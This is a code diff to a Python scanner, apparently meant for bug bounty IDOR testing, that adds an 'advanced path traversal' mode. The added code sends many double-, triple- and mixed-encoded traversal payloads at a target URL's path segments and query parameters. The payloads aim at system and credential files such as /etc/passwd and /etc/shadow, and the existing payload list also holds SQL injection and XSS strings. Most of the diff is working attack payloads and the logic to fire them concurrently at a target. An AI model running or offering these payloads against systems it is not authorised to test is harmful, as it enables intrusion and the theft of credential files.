@@ -58,6 +58,7 @@ class IDORTester:
         self.test_payment_endpoints = getattr(args, 'payment', False)
         self.test_api_keys = getattr(args, 'api_keys', False)
         self.test_oauth_endpoints = getattr(args, 'oauth', False)
+        self.test_advanced_traversal = getattr(args, 'advanced_traversal', False)
         self.user_ids = self._generate_user_ids(args.ids) if args.ids else self._generate_test_ids()
         self.verbose = args.verbose
         self.timeout = args.timeout
@@ -108,8 +109,24 @@ class IDORTester:
             "12345678901234567890", "a", "z", "xyz", "abc",
             # SQLi payloads
             "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*", "'--", "'/*", "' or sleep(5)--",
-            # Path traversal
+            # Basic path traversal
             "../", "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini",
+            # Advanced path traversal techniques
+            # Double encoding
+            "%252e%252e%252f", "%252e%252e%255c", "%252e%252e%252f%252e%252e%252f",
+            "%252e%252e%255c%252e%252e%255c", "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
+            # Mixed slashes
+            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
+            "..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\",
+            # Dotless traversal (encoded dots and slashes)
+            "%2e%2e%2f", "%2e%2e%5c", "%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
+            # Triple encoding
+            "%25252e%25252e%25252f", "%25252e%25252e%25255c",
+            # URL encoding variations
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c",
+            # Mixed encoding
+            "..%2f..%5c..%2f..%5c", "%2e%2e%2f..%5c%2e%2e%2f",
             # Special characters
             "<script>", "<img src=x onerror=alert(1)>", "%00", "%2e", "%2f", "%5c", "%3c", "%3e", "%27", "%22", "%3b", "%26", "%7c", "%24", "%60",
         ]
@@ -187,6 +204,10 @@ class IDORTester:
                 
                 # Authentication bypass testing
                 self._test_auth_bypass(endpoints)
+                
+                # Advanced path traversal testing
+                if self.test_advanced_traversal:
+                    self._test_advanced_path_traversal(endpoints)
                 
                 progress.update(task, completed=True, description="[bold green]Testing completed![/bold green]")
         
@@ -2146,6 +2167,109 @@ class IDORTester:
                 console.print(f"[yellow]Error in JSON payload test: {str(e)}[/yellow]")
             return None
 
+    def _test_advanced_path_traversal(self, endpoints):
+        """Test for advanced path traversal techniques"""
+        if self.verbose:
+            console.print("[bold blue]Testing for advanced path traversal techniques...[/bold blue]")
+        
+        # Advanced path traversal payloads
+        advanced_payloads = [
+            # Double encoding
+            "%252e%252e%252f", "%252e%252e%255c", "%252e%252e%252f%252e%252e%252f",
+            "%252e%252e%255c%252e%252e%255c", "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
+            # Triple encoding
+            "%25252e%25252e%25252f", "%25252e%25252e%25255c",
+            # Mixed slashes
+            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
+            "..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\",
+            # Dotless traversal
+            "%2e%2e%2f", "%2e%2e%5c", "%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
+            # Mixed encoding
+            "..%2f..%5c..%2f..%5c", "%2e%2e%2f..%5c%2e%2e%2f",
+            # URL encoding variations
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c",
+            # Windows path traversal
+            "..\\..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            # Unix path traversal
+            "../../../../etc/passwd", "../../../../etc/shadow", "../../../../etc/hosts",
+            # Mixed path traversal
+            "..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\etc\\shadow",
+            # Encoded sensitive files
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2fetc%2fpasswd",
+            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+            # Double encoded sensitive files
+            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+            "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                url_parts = urlparse(endpoint)
+                path_parts = url_parts.path.split('/')
+                
+                # Test each path segment with advanced traversal payloads
+                for i, part in enumerate(path_parts):
+                    if part and part not in ['', 'http:', 'https:']:
+                        for payload in advanced_payloads:
+                            # Create modified path with traversal payload
+                            new_path_parts = path_parts.copy()
+                            new_path_parts[i] = payload
+                            new_path = '/'.join(new_path_parts)
+                            
+                            new_url = url_parts._replace(path=new_path).geturl()
+                            
+                            futures.append(executor.submit(
+                                self._test_url_for_idor,
+                                original_url=endpoint,
+                                modified_url=new_url,
+                                description=f"Advanced path traversal: replaced '{part}' with '{payload}'"
+                            ))
+                            
+                            # Also test appending the payload
+                            new_path_parts = path_parts.copy()
+                            new_path_parts[i] = part + payload
+                            new_path = '/'.join(new_path_parts)
+                            
+                            new_url = url_parts._replace(path=new_path).geturl()
+                            
+                            futures.append(executor.submit(
+                                self._test_url_for_idor,
+                                original_url=endpoint,
+                                modified_url=new_url,
+                                description=f"Advanced path traversal: appended '{payload}' to '{part}'"
+                            ))
+                
+                # Test with payloads in query parameters
+                query_params = parse_qs(url_parts.query)
+                for param, values in query_params.items():
+                    for payload in advanced_payloads[:10]:  # Limit to avoid too many requests
+                        new_params = query_params.copy()
+                        new_params[param] = [payload]
+                        
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"Advanced traversal in query: changed '{param}' to '{payload}'"
+                        ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in advanced path traversal test: {str(e)}[/yellow]")
+
 def main():
     parser = argparse.ArgumentParser(description='Advanced IDOR Vulnerability Testing Script for Bug Bounty Hunting')
     parser.add_argument('-u', '--url', required=True, help='Target URL')
@@ -2176,6 +2300,9 @@ def main():
     # Enable all high-value tests
     parser.add_argument('--all-high-value', action='store_true', help='Enable all high-value IDOR tests')
     
+    # Advanced testing options
+    parser.add_argument('--advanced-traversal', action='store_true', help='Enable advanced path traversal testing (double encoding, mixed slashes, dotless)')
+    
     args = parser.parse_args()
     
     # Enable all high-value tests if --all-high-value is specified
@@ -2190,6 +2317,7 @@ def main():
         args.payment = True
         args.api_keys = True
         args.oauth = True
+        args.advanced_traversal = True
     
     try:
         tester = IDORTester(args)
